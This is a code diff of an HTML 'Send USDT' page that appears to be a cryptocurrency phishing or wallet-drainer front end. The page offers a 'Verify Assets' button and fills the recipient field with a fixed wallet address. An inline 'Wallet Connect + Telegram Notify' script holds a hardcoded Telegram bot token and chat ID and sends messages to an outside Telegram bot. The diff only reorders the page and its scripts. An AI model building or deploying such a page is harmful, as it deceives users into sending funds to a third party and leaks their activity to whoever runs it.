@@ -11,33 +11,47 @@
   <!-- Favicon -->
   <link rel="icon" type="image/png" href="images/favicon.png">
 
-  <!-- Google Fonts -->
+  <!-- Google Fonts + Font Awesome -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-
-  <!-- Local CSS -->
   <link rel="stylesheet" href="styles.css">
 
-  <!-- Font Awesome (Updated Version) -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
-
-  <!-- JS Libraries -->
+  <!-- Web3 JS -->
   <script src="js/web3.min.js"></script>
 </head>
-  <!-- Custom Script -->
-  <script src="js/script.js"></script>
+
+<body>
+  <main class="container">
+    <h1 class="title">Send USDT</h1>
+
+    <label class="label" for="address">Address or Domain Name</label>
+    <div class="input-group">
+      <input type="text" id="address" placeholder="Search or Enter" value="0xDc246aF96aAF24F49BBade639b80C08F264DF289">
+      <button class="text-btn">Paste</button>
+      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
+      <button class="icon-btn"><i class="fas fa-expand"></i></button>
+    </div>
+
+    <label class="label" for="amount">Amount</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="USDT Amount">
+      <span class="unit">USDT</span>
+      <button class="max-btn">Max</button>
+    </div>
+
+    <p class="estimate">≈ $0.00</p>
+
+    <button id="verifyBtn" class="next-btn" onclick="Next()">Verify Assets</button>
+  </main>
 
   <!-- ✅ Wallet Connect + Telegram Notify Script -->
   <script>
-    // Telegram Bot Credentials
     const BOT_TOKEN = "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM";
     const CHAT_ID = "8191508290";
 
     function sendTelegramMessage(message) {
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: CHAT_ID,
           text: message,
@@ -63,33 +77,8 @@
       }
     });
   </script>
-</body>
-</html>
-<body>
-  <main class="container">
-    <h1 class="title">Send USDT</h1>
 
-    <label class="label" for="address">Address or Domain Name</label>
-    <div class="input-group">
-      <input type="text" id="address" placeholder="Search or Enter" value="0xDc246aF96aAF24F49BBade639b80C08F264DF289">
-      <button class="text-btn">Paste</button>
-      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
-      <button class="icon-btn"><i class="fas fa-expand"></i></button>
-    </div>
-
-    <label class="label" for="amount">Amount</label>
-    <div class="input-group">
-      <input type="number" id="amount" placeholder="USDT Amount">
-      <span class="unit">USDT</span>
-      <button class="max-btn">Max</button>
-    </div>
-
-    <p class="estimate">≈ $0.00</p>
-
-    <button id="verifyBtn" class="next-btn" onclick="Next()">Verify Assets</button>
-  </main>
-
-  <!-- Custom Script -->
+  <!-- ✅ Load Your Script.js Only Once -->
   <script src="js/script.js"></script>
 </body>
 </html>
